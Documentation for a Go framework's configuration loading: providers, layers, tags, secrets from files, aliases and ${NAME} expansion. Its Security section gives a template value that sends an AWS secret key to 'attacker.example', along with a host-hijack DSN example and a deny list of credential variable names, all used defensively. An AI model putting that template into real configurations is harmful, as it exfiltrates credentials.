# Configuration

Configuration is loaded into a struct by a pipeline of **providers**. Where a provider looks for values is derived from the path of the function loading it (`f.Path()`), so the same tree of names that shapes your logs shapes your configuration.

Two providers exist today, environment variables (`config/env`) and JSON (`config/json`). Both are in the core module and need no third party dependencies.

## Loading

```go
cfg := ServerConfig{Addr: ":8080"}   // defaults are just the struct's initial values
f.Load(&cfg)                         // apply the tree's providers
f.Load(&cfg, p1, p2)                 // or apply only these providers
```

- `Load` is a method on `*F`, so it always uses the path of the function it is called on, from anywhere.
- Providers are applied in order and later ones override earlier ones. Only fields a provider actually finds are set, so defaults and earlier providers' values survive. Nil providers are skipped.
- Every provider runs, and every problem is reported (see [Errors](#errors)). Any problem fails the current `f` (see `f.Fail`), so a bad config stops the process with exit status 1.
- The framework's own components (`health.Server`, `transport/http.Server`) call `f.Load(&cfg)` for their settings, then apply any options passed in code. Options therefore win over configuration, which wins over the built-in defaults.

### Layers

Configuration comes from four **layers**, in an order the framework fixes (lowest first), each overriding the ones before it:

| Layer | Marker (`config`) | Default |
|---|---|---|
| Document | `DocumentLayer` | nothing: no file is read unless the program names it |
| Remote | `RemoteLayer` | `etcd.New(client, prefix)` (`config/etcd`) |
| Environment | `EnvironmentLayer` | `env.New()` |
| Command | `CommandLayer` | `flags.New(flags.WithArgs(args))`, only when the program gave `foundation.WithArgs` |

so what is closest to the process, and most deliberate, wins. Out of the box a service reads the environment, and flags when it gives `WithArgs`; files are opt in, because a program that reads a file should say which, in what format. A provider says which layer it is for by its type (it implements one of the marker interfaces, which add one method to `Provider`), so it can't be put in a layer it doesn't belong to, and no option can place a file above the environment. The order doesn't depend on the order of the options.

Each layer has a pair of options: `With...Config` adds to the layer, after what it already holds (so it wins over the default), and `Set...Config` replaces the layer. For the document layer, which starts empty, they differ only after an earlier option.

```go
// a file, then YAML above it (later providers in a layer win)
foundation.Run("svc", fn, foundation.WithDocumentConfig(json.File("config.json"), yaml.File("config.yaml")))

// a file the operator chooses, by a variable the program names
foundation.Run("svc", fn, foundation.WithDocumentConfig(json.FileFromEnv("SHOP_CONFIG")))

// the environment from a map, for a test
foundation.Run("svc", fn, foundation.SetEnvironmentConfig(env.New(env.WithMap(vars))))
```

Options apply in the order they are given, so `Set` after `With` discards what was added and `With` after `Set` adds to what was set. It is a startup error, before anything is read or started, to give none (`WithDocumentConfig()`, which is usually an empty slice that was spread), a nil provider, or two documents that read the same file (however the path is spelt; symbolic links are not followed to find out). To turn the environment layer off, or to run a stack in an order the layers don't give, use `WithConfigProviders`.

**Sharing a setup.** There is no separate "pipeline" type, because the order of the layers is not something a program chooses. A group of layer options that several programs or tests share is just a `foundation.Options` (a slice of options that is itself an option), and a function that returns one gives each run its own providers, which matters because providers remember which keys they were asked for (strict mode):

```go
// companyConfig is what every service in the company reads, above the service's own.
func companyConfig() foundation.Option {
	return foundation.Options{
		foundation.WithDocumentConfig(yaml.File("/etc/shop/config.yaml")),
		foundation.WithRemoteConfig(etcd.New(client, "/services/shop")), // the etcd provider, with a client the program made
	}
}

foundation.Run("shop", fn, companyConfig(), foundation.WithStrictConfig())
```

Options still apply in the order given, so a shared group can be followed by a program's own `With` or `Set`. Don't keep one value of providers and pass it to several runs.

**Naming a file.** `json.File(path)` and `yaml.File(path)` read the path the program gives. It must not be empty: an empty path is an error from `Unmarshal` and `Check`, never a file that is skipped, so a path that came from an unset variable can't quietly mean "no configuration". A missing file is skipped unless `config.WithRequired()` is given. The format is always the program's choice in code, never taken from the environment or a file name, and a relative path is relative to the working directory, so name an absolute path for a service that may start somewhere someone else can write.

**Letting the operator choose.** `json.FileFromEnv("SHOP_CONFIG", config.WithRequired())` (and `yaml.FileFromEnv`) reads the file whose path is in the variable the program names:

- The variable is read once, when the provider is made. If it is unset or empty there is no file (`Path()` is empty and nothing is read), unless `config.WithRequired()` is given, when that is a startup error naming the variable.
- Errors about the file say `$SHOP_CONFIG`, never the path it holds: a value from the environment is not for logs, and pointing the helper at the wrong variable can't leak it. A file named in code still shows its path.
- The name follows the rules of an `alias` (capitals, digits and underscores, at most 128 bytes, and not a variable the system reads or one that holds credentials, such as `PATH`, `HOME`, `AWS_*`, `LD_*`); one that breaks them is an error.
- The framework reads no variable of its own for this. There is no `CONFIG_FILE`: the program names the variable, so the service's operators see it in its documentation.

**A directory of files.** `json.Dir(path)` and `yaml.Dir(path)` read every document in a directory, as a `conf.d` directory is read (Consul and Nomad do the same), and `json.DirFromEnv("SHOP_CONFIGS")` lets the operator choose the directory, with the rules of `FileFromEnv` (errors say `$SHOP_CONFIGS` and the file's own name, never the path the variable holds):

```go
foundation.Run("shop", fn, foundation.WithDocumentConfig(json.Dir("/etc/shop/conf.d")))
```

- **Which files:** names ending in `.json` (`.yaml` or `.yml` for YAML), matched exactly. Hidden files, backups (`name~`, `#name#`), other extensions, subdirectories and links to them are ignored and never opened, and so are names with control characters or invalid UTF-8. There is no recursion and no glob syntax.
- **Order:** by name, byte by byte, so `00-base.json` comes before `10-site.json`, and capitals sort before lower case. Each file overrides the ones before it, and a later file can set a field to `false` or zero.
- **Mistakes are errors, not skipped files:** a link that points nowhere, a named pipe, a file that can't be read, more than 256 files or 32 MiB in all, and each file over the 8 MiB limit. When any file is refused nothing is read from the directory, so the service never runs on some of its files only. A problem in a file's content names the file and is reported with the other files' problems. A missing directory is skipped unless `config.WithRequired()` is given, an empty one is fine, and an empty path is an error.
- **Examples:** `examples/config/files` (JSON: a directory, a file named by a variable and the environment, stacked) and `config/yaml/example/dir` (the same for YAML).
- **Strict mode** checks every file and names the one with the unknown key. A key that is read in one file is known in all of them. Giving the same directory twice is refused.

**Permissions.** Whoever can write to a configuration file, or to the directory it is in, can change what the service does. So `File`, `Dir` and the `FromEnv` forms refuse a file or directory that the group or others can write (`mode & 0022`), and say how to fix it: `chmod go-w` on it. A sticky directory such as `/tmp` passes the directory check, as only an owner can remove their own entries there. Links are followed and the file they point to is checked, as well as the directory that holds the link. The mode is read from the file that was opened, so a file swapped in after the check is not the one that is read. The check is made where files have modes (Unix); on Windows, where access is kept in ACLs, it is not, whatever the option says.

Many systems create files as `0664` (a umask of `0002`), which fails the check until the group bit is removed. Where the deployment can't give the file tighter modes, such as a Kubernetes volume with a loose `defaultMode`, a program turns the check off for that provider, in code: `json.File(path, config.WithoutPermissionCheck())`. Nothing in the environment or a document can turn it off.

The remote layer is for a configuration service shared by a fleet (etcd or similar), which is a provider module of its own like YAML (`config/etcd`, with the official client). It sits above the documents, because a fleet's settings override the file a build ships with, and below the environment, because what is set on one process overrides both. A field is one key, `<prefix>/<function path words in lower case>/<field name as written>`, so the case of a field name matters there (the other providers don't care), and a function's keys are not kept apart from those of a nested struct with the same name. Values are text, read as they are (no trailing newline is removed: `etcdctl put key < file` adds one). All the keys of a struct are read in one read-only transaction; a cluster that can't be read stops startup, it never falls back to the file.

### Explicit providers

`foundation.WithConfigProviders(...)` is the whole stack, chosen by the program, in priority order, with no layers and none of the defaults:

```go
// environment variables only
foundation.Run("svc", fn, foundation.WithConfigProviders(env.New()))

// a stack of your own, in your own order
foundation.Run("svc", fn, foundation.WithConfigProviders(
	json.File("/etc/svc/config.json"),
	secretStore,
	env.New(),
))

// no configuration loading at all
foundation.Run("svc", fn, foundation.WithConfigProviders())
```

Using it together with any layer option is a startup error: the program would be saying two things. Every consumer reads one list (`Load`, help, the strict check, the keys named for a missing required field), made in one place. The providers are held by the root of the tree, so every function sees them, and nothing is global, so tests can use different providers independently. Providers passed directly to `f.Load` bypass the tree's providers for that call.

## Providers

```go
type Provider interface {
	Unmarshal(path []string, dst any) error
}
```

A provider is handed the loading function's path (`f.Path()`, the names given to `Run` on the way down to it) and a pointer to a struct, and sets the fields it has values for. `config.ProviderFunc` adapts a plain function. The `config` package imports nothing but the standard library, so a provider can be written and published without depending on the framework. `dst` must be a non-nil pointer to a struct, otherwise the provider returns an `InvalidUnmarshalError`.

### Field types

Both providers share one decoder (`internal/config/decode`), so they accept and reject the same things. A provider of your own gets the same rules by calling `config.Fields` (which struct fields to load, and which are mistakes), `config.SetString` (text to value) and `config.IsPlainString` (whether empty is a value), as well as `config.Keys` for where to look; `config/config_test.go` has a small provider built that way:

| Type | Notes |
|---|---|
| `string`, `bool`, `float32`, `float64` | |
| `int` to `int64`, `uint` to `uint64` | base 10 only (`010` is ten, not octal); a value that doesn't fit the type is an error, never wrapped or truncated |
| `time.Duration` | `"1m30s"`; JSON also accepts a number of nanoseconds |
| `url.URL` | parsed with `url.Parse` |
| anything implementing `encoding.TextUnmarshaler` | e.g. `time.Time` (RFC 3339), `net.IP`, `slog.Level`, or your own type. This is the hook for custom types. |
| pointers to the above | allocated when a value is found, `nil` otherwise. A new value is allocated each time, so a default shared elsewhere is never modified through the pointer. |
| slices of the above | env: comma separated (`a, b, c`, spaces trimmed); JSON: an array. Replaces the default rather than appending. |
| maps of the above | env: `key:value` pairs, comma separated, split on the first colon so values may contain colons (`home:https://example.com:8080`); JSON: an object. Replaces the default. |
| structs | with a tag: a nested group that extends the path. Without a tag and embedded: its fields are loaded as if declared in the parent. |

A **tagged** field of any other type (`chan`, `func`, `complex`, `any`, arrays, pointers to structs, slices of slices, ...) is an error **when the config is loaded, whether or not a value exists for it**, so a mistake shows at startup, not when someone first sets the variable. Untagged fields are ignored.

A struct that implements `TextUnmarshaler` (like `time.Time`) is a value, not a group.

### Naming a field once: the `config` tag

A field is named once, with the first element of its `config` tag, and every provider that reads names uses it: the environment uppercases it, a file uses it as the key.

```go
type Config struct {
	Addr string `config:"addr"`            // SHOP_API_ADDR, and "addr" in a file
	TLS  struct {
		CertFile string `config:"cert_file"` // SHOP_API_TLS_CERT_FILE, and "tls": {"cert_file": ...}
	} `config:"tls"`
}
```

- **A provider's own tag wins**, for that provider only: `config:"port" env:"PORT_NUMBER"` is `SHOP_API_PORT_NUMBER` in the environment and `port` in a file, and `env:"-"` or `json:"-"` leaves the field out of one provider. A tag of its own with only options takes the common name: `config:"password" env:",file"`. Without a name from either, it is an error.
- **Flags never read it.** `flag:"..."` stays its own choice, as a flag is visible to every user of the machine and carries a short form and help.
- **The name is explicit.** Nothing is taken from the Go field's name, so renaming a field can't change what a service reads. A field with no `config` name and no tag of a provider's own is not read.
- **After the name come options**: `required` and `expand`, as in `config:"addr,required"`. They are options wherever they stand, so `config:"required"` and `config:",required"` still work with a provider tag naming the field, and neither word can be a name. Close misspellings (`requried`, `Required`, `expnad`) are refused as names too: read as a name, one would quietly stop a field being required.
- **A name** is ASCII letters, digits and underscores, starts with a letter, and is at most 64 bytes. Anything else is an error at load. Two fields that end up with the same name for one provider are an error on the later one, compared without regard to case, as the environment uppercases names and a file's keys are matched that way.
- **A mistake shows whatever the provider's tag says**, so it can't wait for the day that tag is removed.
- **Give a key once.** Go reads the first value of a repeated key, so `config:"addr" config:"required"` would drop `required` without a word. A key the framework reads (`config`, `env`, `flag`, `help`, `json`, `yaml`) given twice in one tag, or a tag that can't be read to the end and has one of them in it, is an error for the field, in a run and in a dry run: write `config:"addr,required"`. Tags of other libraries are left alone.
- **It widens what can set a field.** One tag means the environment and every file can set it, where separate tags were a choice for each. For a secret that should only come from a file the environment reads, keep the provider's own tag (`env:"PASSWORD,file"`, see [Secrets from files](#secrets-from-files)) and no `config` name.

A provider of your own gets all of this from `config.Fields`: a `Field` whose `Common` is true was named by the config tag and not by the provider's own, which is how the environment knows to uppercase it.

### Environment variables: `config/env`

The variable name is the path's keys (see [How the path maps](#how-the-path-maps)), uppercased and joined with `_`, then the field's name: its `env` tag, or else its [`config` name](#naming-a-field-once-the-config-tag) in capitals.

```go
type Config struct {
	Addr string `config:"addr"` // or env:"ADDR"
}
// path ["foo", "http.server"] -> FOO_HTTP_SERVER_ADDR
```

- Nested structs need a name too, which extends the prefix: a field `TLS` tagged `config:"tls"` (or `env:"TLS"`) with an inner `CertFile` tagged `config:"cert_file"` reads `FOO_HTTP_SERVER_TLS_CERT_FILE`. An embedded struct with neither a tag nor a name loads as if its fields were declared in the parent (`FOO_REGION`, not `FOO_SHARED_REGION`).
- Names are matched **exactly**, so `APP_addr` is a different variable from `APP_ADDR`, as the operating system sees them on Linux and macOS.
- By default variables come from the process environment. `env.New(env.WithLookup(fn))` reads them from anywhere else: `fn` is given the exact name and reports `(value, ok)`, the same signature as `os.LookupEnv`, and a nil `fn` means the process environment. `env.WithMap(m)` is the shortcut for tests. See [Testing](#testing).
- `env:"-"` skips a field. The name may be left out when the field has a `config` name (`env:",file"`). The options after the name are `file` (see [Secrets from files](#secrets-from-files)) and `alias` (see [Names a platform chooses](#names-a-platform-chooses)): anything else (such as `env:"NAME,required"`) is an error, not silently ignored. Required fields and validation belong in `f.Load`, after every provider has run, with the separate `config:"required"` tag.
- Two fields can't read the same variable. That is an error on the later one, naming the other, and one of them has to be renamed. It matters most with files, where `env:"CERT,file"` also reads `..._CERT_FILE`, which a field tagged `CERT_FILE` would read too.
- **An empty variable counts as not set**, so `FOO=` can't wipe out a default or fail to parse. The exception is a plain string, where empty is a real value and blanks the default.
- Durations use `time.ParseDuration` syntax (`"15s"`), so a bare number is an error.

### JSON: `config/json`

The provider walks the JSON object along the path's keys, one nested object per key (matched case-insensitively), and maps the field's name onto the object it finds there: its `json` tag, or else its [`config` name](#naming-a-field-once-the-config-tag). `json:"-"` and fields with neither are skipped.

```go
type Config struct {
	Addr string `config:"addr"` // or json:"addr"
}
```

```json
{
  "foo": {
    "http.server": {
      "addr": ":8080"
    }
  }
}
```

- `json.File(path, opts...)` reads a file. A missing file is skipped unless you pass `config.WithRequired()`; any other error is returned. The path must be a regular file of at most 8 MiB (symbolic links are followed): a directory, a named pipe or a device is an error, and so is a larger file, rather than being read in full.
- `json.Raw(data)` reads bytes you already have.
- If any segment of the path is absent from the JSON, nothing is set and there is no error.
- Numbers are read exactly (an integer above 2^53 is not rounded), and a fraction for an integer field, or a number that doesn't fit, is an error. Integers and floats may also be given as strings (`"8080"`, base 10).
- `null`, and a key that is absent, leave the field as it is.
- Standard tag options such as `omitempty` are accepted and ignored; `json:"-"` skips a field. A `json` tag with no name (`json:",omitempty"`) takes the field's `config` name, and without one is an error: a field that is quietly not read is a mistake.
- Two fields that read the same key, whatever the case, are an error on the later one, naming the other.
- **A key that is there more than once is an error.** `{"addr": "a", "ADDR": "b"}` has no single value for `addr`: which one a reader finds is not defined, and a reviewer could approve one while the service runs the other. The field fails with `config.ErrAmbiguous`, naming the spellings (`"addr", "ADDR": appears more than once`) and not the values, and nothing is loaded from it; the other fields are unaffected. The same key twice (`"addr"` and `"addr"`) is ambiguous too. Only keys that are read count, so a repeated `"_comment"` in an object, or a section that belongs to another service, is fine. If a segment on the function's own path repeats (`"svc"` and `"SVC"`), the whole load fails. Entries of a map field are case sensitive, so only the exact same key twice is ambiguous there.
- A second JSON document after the first in the same file or bytes is an error, not ignored.

### YAML: `config/yaml`

YAML is a separate module, `go.krak3n.dev/foundation/config/yaml`, so that the core keeps no dependencies (the parser is `go.yaml.in/yaml/v3`, used only to build a tree of nodes; no value is ever decoded by it). It reads names exactly as the JSON provider does, one nested mapping per key of the path, matched case-insensitively, and a field is read by its `yaml` tag or else its [`config` name](#naming-a-field-once-the-config-tag) (`yaml:"-"` skips it, `yaml:",omitempty"` takes the common name). Nothing needs a `yaml` tag.

```go
foundation.Run("foo", run,
	foundation.WithDocumentConfig(yaml.File("config.yaml")),
)
```

```yaml
foo:
  http:
    server:
      addr: ":8080"
```

It is not in the defaults: you choose it with `WithDocumentConfig`, and the environment and flags layers are untouched. `yaml.FileFromEnv("SHOP_CONFIG")` lets the operator choose the file, still read as YAML. See `config/yaml/example`.

A configuration file is untrusted input (a ConfigMap, a template, a pull request), so the provider accepts a **strict subset** of YAML, and refuses the rest as a whole, wherever it is in the file, even in parts nothing reads:

- **Anchors and aliases** (`&a`, `*a`): they let a few lines expand to gigabytes, and a value be somewhere other than where it reads.
- **Merge keys** (`<<`) and **explicit tags** (`!!binary`, `!custom`): the value is not what a reviewer sees.
- **Complex keys** (a key that isn't a scalar) and **more than one document** in the file (`---`).
- Control characters, text that isn't UTF-8, a top level that isn't a mapping, and files over 8 MiB, more than 64 levels of nesting or more than 100,000 nodes.

The cost is that a file shared with a tool that uses anchors is refused. Loosening later is compatible; tightening would not be.

- **A scalar is the text as written**, never what YAML 1.1 makes of it. `no`, `on`, `0755`, `1_000`, `.inf` and `2001-12-14` are those strings where a string is wanted. Numbers are parsed as in the other providers (integers in base 10, so `0755` is 755 and `0x10` and `1_000` are errors), a duration is `30s` (a bare `30` is an error), and a bool is exactly `true` or `false`: `yes`, `on`, `1` and `True` are errors, because another tool may read them differently.
- Quoted values work for every type (`"8080"`), a sequence is a slice (one element per item, so a comma is not a separator) and a mapping is a map.
- `null`, `~` and an empty value leave the field as it is; quoted (`"null"`, `""`) they are strings.
- A key that is read and appears more than once, exactly or differing only in case, is `config.ErrAmbiguous` for the field, as in JSON; repeated keys nobody reads are fine. A scalar where a mapping belongs (`svc: 5`) is an error rather than a missing section, which JSON quietly ignores.
- Errors give the line and the kind of mistake, `yaml: line 3: anchors are not supported`, and never any of the file: no parser message is used, because it may quote the input.
- `yaml.File(path, config.WithRequired())` and `yaml.Raw(data)` are as in JSON, with the same file rules (a regular file, symbolic links followed). `Describe` and `Check` (strict mode) are implemented.

## Reloading when a file changes

A file or directory provider can ask for the program to restart when what it reads changes, with an option that every one takes:

```go
foundation.Run("shop", fn,
    foundation.WithDocumentConfig(json.File("config.json", config.WithRestartOnChange())),
)
```

The option is the program's choice, in code, for the provider it is given to: nothing in the environment or a file can turn it on, and a provider without it is never watched. The framework starts one watcher for every provider that asked, before the root function runs, so nothing is loaded that is not also watched. A change is a restart, which only goes ahead if the new configuration loads (the candidate dry run, see `RestartPolicy`): a bad edit is rejected with an error and the running program is left alone. A directory is watched for the files its provider reads (`json.Dir` the `.json` files, `yaml.Dir` `.yaml` and `.yml`), so editor swap files, backups and hidden files are not changes. A path that came from the environment (`FileFromEnv`, `DirFromEnv`) is named `$NAME` in logs, never by value. A provider given only to `f.Load` is not part of the program's configuration, so asking to restart on it is an error, not a silent no-op. A provider written elsewhere takes part by implementing `config.Restartable`. See `examples/config/reload`.

## Errors

Providers report **every** problem they find, not just the first, so a service with several mistakes in its configuration says so in one go instead of once per restart. `f.Load` also runs every provider before failing, so a malformed file and a bad environment variable are both reported by the same run.

A problem with a field is a `*config.FieldError`:

| | |
|---|---|
| `Provider` | which provider found it: `env`, `json` |
| `Field` | the Go field path, `TLS.CertFile`; an embedded struct's fields are named as if declared in the parent |
| `Key` | where the value is looked up: `SVC_TLS_CERT_FILE` for env, `svc.tls.cert_file` for JSON; empty when the tag has no name |
| `Err` | what was wrong; `errors.Is` and `errors.As` see through it |

Providers return them joined with `errors.Join`, so use `errors.As` to find one. Mistakes in the struct itself (an unsupported type, a bad tag option) come first, then problems with values, each in the order the fields are declared. Fields that are fine are still set, so the destination is partly populated when there are errors. Anything that isn't about one field, such as a file that can't be read or a document that isn't valid JSON, is a plain error.

`f.Load` logs each problem as its own error, then fails once with a summary:

```
ERROR invalid configuration fn=svc provider=env field=Port key=SVC_PORT err="not a valid integer: value out of range"
ERROR invalid configuration fn=svc provider=env field=TLS.Port key=SVC_TLS_PORT err="not a valid integer: invalid syntax"
ERROR shutting down due to failure fn=svc err="invalid configuration" count=2
```

so each problem is a searchable record with real fields in JSON logs (the field and key say which value to look at), and the process exits with status 1. Attributes a provider doesn't know are left out rather than made up. A provider you write should return `*config.FieldError` for field problems and join everything it finds.

`examples/config/errors` is a runnable service with several mistakes spread across a JSON document and the environment, which fails this way; it also shows the path mapping (`shop/api` becomes `SHOP_API_...` and `shop.api...`) and the layering of providers.

**An error never contains the configuration value.** The standard library's parsing errors quote their input (`parsing "hunter2": invalid syntax`, `parse "https://admin:hunter2@[::1"`), and a value is whatever someone put there: a password in the wrong field, a URL with credentials in it. Errors are logged, so the decoder says what was wrong, in words of its own, and nothing else: `not a valid integer: invalid syntax`, `not a valid integer: value out of range`, `not a valid number`, `not a valid bool`, `not a valid duration, such as 30s`, `not a valid URL`, `not a valid time.Time`. A number keeps its kind (`errors.Is(err, strconv.ErrRange)` works), slices and maps say which item (`item 1: ...`), and a type with its own `UnmarshalText` is named but its error isn't shown, as such errors usually quote the input. There is no `secret` option to remember: the rule has no exceptions.

**Problems are logged with control characters escaped.** The names in a problem (a key in the document, a variable that nothing asked for) come from whatever is being read, and anyone who can change that controls them. A newline in a log line forges another line and an escape sequence repaints a terminal, whatever the log handler does, so `provider`, `field`, `key` and `err` show them as `\n` and `\x1b`. The `*config.FieldError` you get back is unchanged.

A struct mistake (such as an unsupported field type) is found by every provider that reads the struct, so it appears once per provider, each time with that provider's key.

## Required fields and validation

Two checks run inside `Load`, after every provider, so that a service doesn't start on a configuration that is incomplete or makes no sense. Both report through the same `invalid configuration` lines as the other problems, and everything wrong is reported in one go.

**`config:"required"`** marks a field that must end up with a value from some source: a provider, or a default set on the struct before `Load`.

```go
type Config struct {
    Addr  string `config:"addr,required"`
    Burst *int   `config:"burst,required"`
}
```

```
ERROR invalid configuration fn=shop/api field=Addr key="shop.api.addr, SHOP_API_ADDR" err="required but not set"
```

- It is a separate tag from `env` and `json`, so it works the same whichever provider supplies the value, and a provider you write yourself needs no support for it.
- Zero is "not set": `0`, `false`, an empty string, a nil pointer, an empty slice or map. So a plain `int` can't be explicitly zero. Use a pointer, where nil is the only unset state. The check looks at the struct afterwards rather than asking providers, which keeps the `Provider` interface unchanged.
- Nested structs and embedded structs are walked into. `required` on a struct is an error, as is any option other than `required`; mark its fields instead.
- A field a provider has already reported (a value that didn't parse) isn't also reported as missing.
- It is checked even when `Load` has no providers (`WithConfigProviders()`), so then a default is the only way to satisfy it.
- The `key` names where each provider that can say would look (see below), in provider order, so the message says which variable to set. Providers that can't describe themselves are left out, and with none there is no `key`.

**`Validate() error`** on the struct (the `config.Validator` interface) holds the rules between fields.

```go
func (c *Config) Validate() error {
    if c.TLS.KeyFile != "" && c.TLS.CertFile == "" {
        return &config.FieldError{Field: "TLS.CertFile", Err: errors.New("needed when TLS.KeyFile is set")}
    }

    return nil
}
```

- `Load` calls it only if nothing else went wrong, so it never has to cope with a half loaded struct. That means problems show in two stages: fix the missing and malformed values, then the rules between them.
- Return several problems with `errors.Join`; each is logged on its own line, nested joins included. A `*config.FieldError` names the field it is about; any other error is logged without one.
- Only the struct given to `Load` is validated. Its `Validate` calls those of nested structs if they should run.
- It runs on every `Load`. Components such as `http.Server` load and then apply programmatic option overrides, so `required` and `Validate` suit your own structs rather than fields that options can fill in.

See `examples/config/validate`.

## Secrets from files

Docker, Compose and Kubernetes hand secrets to a container as files (`/run/secrets/db_password`), which keeps them out of the process environment, `docker inspect` and `/proc/<pid>/environ`. A field opts in with the `file` option:

```go
type Config struct {
    Password string `env:"PASSWORD,file" config:"required"`
}
```

For the path `shop > api` the provider reads `SHOP_API_PASSWORD` as usual, or, if `SHOP_API_PASSWORD_FILE=/run/secrets/db_password` is set, the contents of that file.

- **Explicit.** Only fields with the option read a file. `SHOP_API_ADDR_FILE` for a field without it is not recognised, which strict mode reports like any other typo.
- **Both set is an error.** The two are ambiguous, so neither is used. An empty plain variable doesn't count as set, and neither does an empty `_FILE` variable.
- **One line.** A secret file holds a single value, so trailing newlines (`\n`, `\r\n`) are removed. Nothing else is trimmed, as a secret may contain spaces.
- **Any type.** The contents go through the same conversion as a variable, so an `int`, a duration or a list works. An empty file is a value only for a plain string, as for variables.
- **Errors name the file, not its contents.** A missing or unreadable file reports the variable (`reading $SVC_PASSWORD_FILE: no such file or directory`) and the cause (`errors.Is(err, fs.ErrNotExist)` works), never the path, which may be a secret put in the wrong variable. A value in the file that doesn't fit the field says so without repeating it, because errors are logged.
- It composes with the rest: `config:"required"` is satisfied by a file, strict mode knows the `_FILE` variable, `Describe` lists both names for the field, and a missing required field says to set either.
- **A secret file must be a regular file of at most 1 MiB** (symbolic links are followed, as a Kubernetes secret volume is a chain of them). A named pipe would block startup until something wrote to it, and a device such as `/dev/zero` never ends, so they are refused, as is a directory or a larger file, with an error naming the path. This means a `_FILE` can't be process substitution (`/dev/fd/63`).
- The file is read once, when `Load` runs, so a rotated secret needs a restart. Redacting secrets when a whole config struct is logged is not covered: log what you need (see `examples/config/secrets`).

See `examples/config/secrets`.

## Names a platform chooses

Cloud Run, Fly, Heroku and Railway set `PORT`, and Heroku and Railway set `DATABASE_URL`, under those names and no others. Your own names are `SHOP_API_PORT` and `SHOP_API_DATABASE_URL`, and you can't make the platform use them. A field can name a second variable to read, as it is:

```go
type Config struct {
    Port int    `config:"port" env:",alias=PORT"`
    DSN  string `config:"dsn" env:",alias=DATABASE_URL"`
}
```

The provider reads `SHOP_API_PORT`, or, if that isn't set, `PORT`: the same binary runs on a laptop, in Kubernetes with prefixed variables and on a platform that sets `PORT`.

- **The prefixed variable wins.** The platform always sets `PORT`, so it has to be possible to override it: when both are set the alias is not even parsed, so a bad `PORT` is no error. Which one was used is logged at `Debug` (`env alias ignored`, with the field and both names, never a value).
- **Explicit.** Only a field with `alias=` reads an unprefixed name, and it reads exactly the one it names. It is absolute: the same for every path.
- **Same rules as any variable.** An empty alias is not set, except for a plain string; the type conversion and its errors are the same, and an error names the alias (`key=PORT`) and never the value.
- **Mistakes stop startup.** A name that isn't capital letters, digits and underscores (not starting with a digit, at most 128 bytes), `alias` twice, on a struct or together with `file`, and an alias that another field also reads (as its name, `_FILE` variable or alias) are errors, even when nothing is set.
- **Some names can't be aliased:** `PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`, `PWD`, `OLDPWD`, `IFS`, `TMPDIR`, the AWS access key, secret key and session token, `GOOGLE_APPLICATION_CREDENTIALS`, and anything starting `LD_`, `DYLD_` or `SSH_`. Reading them into configuration would put the system's variables, or another system's credentials, in a struct that gets logged. This is a safety net for mistakes, not a full list: `Describe` (see [Listing the names](#listing-the-names)) shows every unprefixed name a service reads, so it can be reviewed.
- **Aliases are an environment feature.** Other providers ignore the option and read their own tags. `Describe` lists the name, then the alias; `config:"required"` says to set either; strict mode counts the alias as asked for.
- **Keep aliases to the service's own configuration.** Two functions that alias the same name read the same variable.

## Expanding variables

A configuration file can be a template. It is checked in, but some of what it needs only exists at deploy time, under names the platform chooses: Kubernetes secrets, the postgres image's variables, the `PORT` that Heroku and Cloud Run set. A field tagged `config:"expand"` has `${NAME}` references in its value replaced from the environment:

```json
{"shop": {"api": {
  "dsn":  "postgres://${DB_USER}:${DB_PASSWORD}@${DB_HOST:-localhost}:5432/shop",
  "addr": ":${PORT:-8080}"
}}}
```

```go
type Config struct {
    DSN  string `config:"dsn,required,expand"`
    Addr string `config:"addr,expand"`
}
```

| Written | Result |
|---|---|
| `${NAME}` | The value of `NAME`. Set to empty counts as defined. |
| `${NAME:-default}` | `NAME`, or `default` if it is unset or empty. The default is literal text up to the first `}`, so it can't contain a reference. |
| `$$` | A literal `$`. |

Anything else is literal, including `$NAME` and a lone `$`: only the braced form is a reference. Names are letters, digits and underscores and don't start with a digit.

- **Explicit.** Only fields with the tag are templates, and it works the same whichever provider supplied the value (JSON, env, a provider of your own). It applies to `string` and `*string` only, so `"port": "${PORT}"` into an `int` isn't supported; use a string such as `":${PORT}"`. Any other type is a mistake reported at load time.
- **An undefined variable is an error,** not an empty string, so a missing password can't slip through as a blank one. It is reported against the field with the variable as `key` (`config.ErrUndefined`), and every one is reported in a single run. A syntax error (an unterminated `${`, an empty or invalid name) is reported against the field too.
- **Only what a provider supplied is expanded,** not defaults set on the struct, which the developer can build in code. Because a field a `Load` leaves unchanged isn't expanded again, a second `Load` on the same struct can't expand what an earlier one produced. The one edge: text a provider supplies that is identical to the default is taken as the default, and stays literal. That fails visibly (a `${...}` in the value) rather than unsafely.
- **One pass.** The text is read once and a value is never scanned again, so what a variable holds, even something that looks like `${OTHER}`, can't cause another lookup.
- **Order.** Providers, then expansion, then `required`, then `Validate`, so both see the expanded value. `${X:-}` that expands to nothing counts as not set.
- **Where variables come from** is the process environment, or `foundation.WithLookupEnv(fn)`, with the signature of `os.LookupEnv`. It is separate from the env provider's source because that reads configuration and this reads values to substitute into it: a test that gives the env provider `env.WithMap` will want to give expansion the same.
- **Not for secrets read from files.** `expand` together with the env `file` option is an error, because the contents of a secret file are a secret, not a template: a `$$` would be changed and a `${NAME}` replaced.

See `examples/config/expand`.

### Security

- **The configuration file is as trusted as code.** `${NAME}` can name any variable, not just ones the service owns, so whoever can edit a field that expands can send any environment variable (an unrelated cloud credential, say) wherever that field ends up: `"https://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}"`. Tagging only the fields that need it limits where, not which variables. To limit which, give `WithLookupEnv` a function that answers only for names you allow, such as `DB_*` and `PORT`.
- **Values are substituted as they are.** A password with `@`, `/`, `:` or `?` in a `postgres://user:${DB_PASSWORD}@host` DSN misparses, or can change the host (`pw@evil.example/`). Whoever provides the variable has to escape it for where it is going.
- **The result holds secrets in an innocently named field.** A DSN with the password in it is easy to log with the rest of the config. Log `url.URL.Redacted()` or the parts you need, and note that `url.Parse` quotes the whole string in its errors. Messages from the framework name variables, never values.
- **A field read from a file is never expanded.** A provider that can read a field from a file says so by implementing `config.FileBacked` (`FileFields(path, dst)` lists the Go names of those fields), and `Load` reports `config:"expand"` on any of them as a mistake, whichever provider it is. The env provider lists the fields with the `file` option. A third party provider with a file option of its own should implement it, as nothing else tells `Load`.
- Resource use is bounded: the text is read once, with no recursion.

## Listing the names

A provider that implements `config.Describer` can say where it would look for each field, without looking:

```go
keys, err := env.New().Describe([]string{"shop", "api"}, &Config{})
// keys: [{Addr SHOP_API_ADDR} {TLS.CertFile SHOP_API_TLS_CERT_FILE} ...]
```

